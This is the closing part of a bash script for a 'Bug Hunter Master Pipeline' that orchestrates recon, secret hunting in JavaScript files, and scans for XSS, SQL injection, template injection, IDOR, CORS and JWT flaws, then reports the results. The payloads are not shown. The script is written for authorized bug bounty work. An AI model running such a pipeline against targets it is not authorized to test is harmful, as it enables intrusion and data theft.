      <div class="stat-card yellow"><div class="stat-num">${IDOR_COUNT:-0}</div>  <div class="stat-lbl">IDOR</div></div>
      <div class="stat-card yellow"><div class="stat-num">${CORS_COUNT:-0}</div>  <div class="stat-lbl">CORS</div></div>
      <div class="stat-card purple"><div class="stat-num">${JWT_COUNT:-0}</div>   <div class="stat-lbl">JWT Vulns</div></div>
      <div class="stat-card blue">  <div class="stat-num">${GQL_COUNT:-0}</div>   <div class="stat-lbl">GraphQL</div></div>
      <div class="stat-card red">   <div class="stat-num">${TOTAL_FINDINGS}</div> <div class="stat-lbl">⚡ TOTAL</div></div>
    </div>
  </div>

  <!-- Phase 1 -->
  <div class="section">
    <div class="section-header">
      <h2>🔍 Phase 1 — Reconnaissance</h2>
      <span class="badge b-info">RECON</span>
    </div>
    <p style="color:var(--muted);font-size:.8rem;margin-bottom:.8rem">Top scored juicy targets:</p>
    <pre class="${SCORED_TARGETS:+has-findings}">${SCORED_TARGETS}</pre>
  </div>

  <!-- Phase 2 -->
  <div class="section">
    <div class="section-header">
      <h2>🔑 Phase 2 — JavaScript Secret Hunter</h2>
      <span class="badge b-crit">CRITICAL</span>
    </div>
    <p style="color:var(--muted);font-size:.8rem;margin-bottom:.8rem">Hardcoded secrets / API keys found in JS files:</p>
    <pre class="${JS_SECRETS/#No*/no-findings}">${JS_SECRETS}</pre>
    <p style="color:var(--muted);font-size:.8rem;margin-bottom:.8rem">Exposed source maps (.map files):</p>
    <pre class="${SOURCEMAPS/#None*/no-findings}">${SOURCEMAPS}</pre>
  </div>

  <!-- Phase 3 -->
  <div class="section">
    <div class="section-header">
      <h2>💉 Phase 3 — Parameter Vulnerabilities</h2>
      <span class="badge b-high">INJECTION</span>
    </div>
    <p style="color:var(--muted);font-size:.75rem;margin-bottom:.5rem"><span class="badge b-high">XSS</span> Confirmed Cross-Site Scripting:</p>
    <pre class="${XSS_HITS/#None*/no-findings}">${XSS_HITS}</pre>
    <p style="color:var(--muted);font-size:.75rem;margin-bottom:.5rem"><span class="badge b-crit">SQLi</span> SQL Injection (error-based):</p>
    <pre class="${SQLI_HITS/#None*/no-findings}">${SQLI_HITS}</pre>
    <p style="color:var(--muted);font-size:.75rem;margin-bottom:.5rem"><span class="badge b-crit">SSTI</span> Server-Side Template Injection:</p>
    <pre class="${SSTI_HITS/#None*/no-findings}">${SSTI_HITS}</pre>
    <p style="color:var(--muted);font-size:.75rem;margin-bottom:.5rem"><span class="badge b-med">REDIRECT</span> Open Redirect:</p>
    <pre class="${REDIR_HITS/#None*/no-findings}">${REDIR_HITS}</pre>
  </div>

  <!-- Phase 4 -->
  <div class="section">
    <div class="section-header">
      <h2>🎯 Phase 4 — Broken Access Control</h2>
      <span class="badge b-crit">P1/P2</span>
    </div>
    <p style="color:var(--muted);font-size:.75rem;margin-bottom:.5rem"><span class="badge b-high">IDOR</span> Insecure Direct Object Reference:</p>
    <pre class="${IDOR_HITS/#None*/no-findings}">${IDOR_HITS}</pre>
    <p style="color:var(--muted);font-size:.75rem;margin-bottom:.5rem"><span class="badge b-high">CORS</span> Misconfiguration:</p>
    <pre class="${CORS_HITS/#None*/no-findings}">${CORS_HITS}</pre>
    <p style="color:var(--muted);font-size:.75rem;margin-bottom:.5rem"><span class="badge b-crit">METHOD</span> Admin Method Bypass:</p>
    <pre class="${METHOD_HITS/#None*/no-findings}">${METHOD_HITS}</pre>
    <p style="color:var(--muted);font-size:.75rem;margin-bottom:.5rem"><span class="badge b-crit">JWT</span> JWT Vulnerabilities:</p>
    <pre class="${JWT_HITS/#None*/no-findings}">${JWT_HITS}</pre>
  </div>

  <!-- Output -->
  <div class="section">
    <div class="section-header"><h2>📁 Output Structure</h2></div>
    <pre>${OUTPUT_DIR}/
├── 01_recon/       → subdomains, live hosts, cloud assets, ports
├── 02_js_hunter/   → secrets, endpoints, source maps
├── 03_param_hunter/→ XSS, SQLi, SSTI, redirect findings
├── 04_bac_finder/  → IDOR, CORS, JWT, GraphQL, 403-bypass
├── pipeline.log    → full execution log
└── stats.env       → numeric summary</pre>
  </div>

</div>

<footer>
  <span>Bug Hunter Master Pipeline v2.0 &nbsp;·&nbsp; ${TARGET} &nbsp;·&nbsp; $(date '+%Y-%m-%d')</span>
  <span style="color:var(--red)">⚠️  Authorized testing only — Unauthorized use is illegal</span>
</footer>
</body>
</html>
HTMLEOF

  log SUCCESS "HTML report generated: $REPORT"
  echo "REPORT_PATH=$REPORT" >> "$OUTPUT_DIR/stats.env"
}

# ═══════════════════════════════════════════════════════════════════════════
# FINAL SUMMARY
# ═══════════════════════════════════════════════════════════════════════════
print_summary() {
  source "$OUTPUT_DIR/stats.env" 2>/dev/null || true
  local ELAPSED=$(( SECONDS - START_TIME ))
  local TOTAL_FINDINGS=$(( \
    ${SECRETS_COUNT:-0} + ${XSS_COUNT:-0}  + ${SQLI_COUNT:-0} + \
    ${SSTI_COUNT:-0}    + ${IDOR_COUNT:-0} + ${CORS_COUNT:-0} + \
    ${MAP_COUNT:-0}     + ${JWT_COUNT:-0}  + ${GQL_COUNT:-0}  ))

  echo ""
  echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗"
  echo -e "║          BUG HUNTER PIPELINE v2.0 — COMPLETE              ║"
  echo -e "╠════════════════════════════════════════════════════════════╣"
  printf  "║  %-12s : %-43s║\n" "Target"   "$TARGET"
  printf  "║  %-12s : %-43s║\n" "Mode"     "$MODE"
  printf  "║  %-12s : %-43s║\n" "Duration" "${ELAPSED}s"
  echo -e "╠════════════════════════════════════════════════════════════╣"
  printf  "║  %-12s : ${GREEN}%-43s${CYAN}║\n" "Subdomains" "${TOTAL_SUBS:-0}"
  printf  "║  %-12s : ${GREEN}%-43s${CYAN}║\n" "Live Hosts" "${TOTAL_LIVE:-0}"
  echo -e "╠════════════════════════════════════════════════════════════╣"
  printf  "║  %-12s : ${RED}%-43s${CYAN}║\n" "🔑 Secrets"  "${SECRETS_COUNT:-0}  ← CRITICAL"
  printf  "║  %-12s : ${ORANGE}%-43s${CYAN}║\n" "🗺  Src Maps" "${MAP_COUNT:-0}  ← HIGH"
  printf  "║  %-12s : ${YELLOW}%-43s${CYAN}║\n" "💉 XSS"      "${XSS_COUNT:-0}"
  printf  "║  %-12s : ${RED}%-43s${CYAN}║\n" "🗃  SQLi"     "${SQLI_COUNT:-0}  ← CRITICAL"
  printf  "║  %-12s : ${RED}%-43s${CYAN}║\n" "🧨 SSTI"     "${SSTI_COUNT:-0}  ← CRITICAL"
  printf  "║  %-12s : ${YELLOW}%-43s${CYAN}║\n" "🔢 IDOR"     "${IDOR_COUNT:-0}"
  printf  "║  %-12s : ${YELLOW}%-43s${CYAN}║\n" "🌐 CORS"     "${CORS_COUNT:-0}"
  printf  "║  %-12s : ${RED}%-43s${CYAN}║\n" "🔐 JWT"      "${JWT_COUNT:-0}  ← CRITICAL"
  printf  "║  %-12s : ${CYAN}%-43s${CYAN}║\n" "📊 GraphQL"  "${GQL_COUNT:-0}"
  echo -e "╠════════════════════════════════════════════════════════════╣"
  printf  "║  ${WHITE}%-12s : ${RED}%-43s${CYAN}║\n" "⚡ TOTAL"    "$TOTAL_FINDINGS FINDINGS"
  echo -e "╠════════════════════════════════════════════════════════════╣"
  printf  "║  %-12s : %-43s║\n" "📁 Output"  "$OUTPUT_DIR"
  printf  "║  %-12s : %-43s║\n" "📄 Report"  "${REPORT_PATH:-N/A}"
  echo -e "╚════════════════════════════════════════════════════════════╝${RESET}"

  [[ $TOTAL_FINDINGS -gt 0 ]] && \
    notify "SUCCESS" "Pipeline complete for $TARGET — $TOTAL_FINDINGS findings! Output: $OUTPUT_DIR"
}

# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════
main() {
  print_banner
  parse_args "$@"

  [[ -z "$TARGET" ]] && {
    echo -e "${RED}[ERROR] -d <domain> is required${RESET}"
    print_help; exit 1
  }

  # Sanitize target (strip protocol if given)
  TARGET=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')

  # Output dir
  [[ -z "$OUTPUT_DIR" ]] && OUTPUT_DIR="$(pwd)/hunt_${TARGET}_${TIMESTAMP}"
  mkdir -p "$OUTPUT_DIR"
  LOG_FILE="$OUTPUT_DIR/pipeline.log"
  touch "$LOG_FILE" "$OUTPUT_DIR/stats.env"

  log INFO "Target      : $TARGET"
  log INFO "Output      : $OUTPUT_DIR"
  log INFO "Mode        : $MODE"
  log INFO "Threads     : $THREADS  |  Rate-limit: ${RATE_LIMIT} req/s"
  [[ -n "$USER_TOKEN"     ]] && log INFO "Auth JWT    : SET ($(echo $USER_TOKEN | cut -c1-20)...)"
  [[ -n "$COLLAB_SERVER"  ]] && log INFO "OOB server  : $COLLAB_SERVER"
  [[ -n "$TELEGRAM_TOKEN" ]] && log INFO "Telegram    : ENABLED"
  [[ -n "$SLACK_WEBHOOK"  ]] && log INFO "Slack       : ENABLED"
  echo ""

  check_tools

  echo -e "${YELLOW}  ┌─────────────────────────────────────────────────────────┐"
  echo -e "  │ ⚠  LEGAL REMINDER                                       │"
  echo -e "  │    Run ONLY on authorized targets / bug bounty programs  │"
  echo -e "  │    Unauthorized scanning is ILLEGAL in most jurisdictions│"
  echo -e "  └─────────────────────────────────────────────────────────┘${RESET}"
  echo ""
  sleep 2

  case $MODE in
    recon)
      phase_recon
      ;;
    hunt)
      # Expects prior recon output in $OUTPUT_DIR
      [[ ! -f "$OUTPUT_DIR/01_recon/all_subs.txt" ]] && {
        log WARN "No recon output found in $OUTPUT_DIR — running recon first..."
        phase_recon
      }
      phase_js_hunter
      phase_param_hunter
      phase_bac_finder
      $SKIP_REPORT || phase_report
      ;;
    monitor)
      [[ ! -f "$OUTPUT_DIR/01_recon/all_subs.txt" ]] && phase_recon
      phase_monitor_setup
      ;;
    full|*)
      phase_recon
      $ONLY_RECON && { print_summary; exit 0; }
      phase_js_hunter
      phase_param_hunter
      phase_bac_finder
      $SKIP_MONITOR || phase_monitor_setup
      $SKIP_REPORT  || phase_report
      ;;
  esac

  print_summary
}

main "$@"
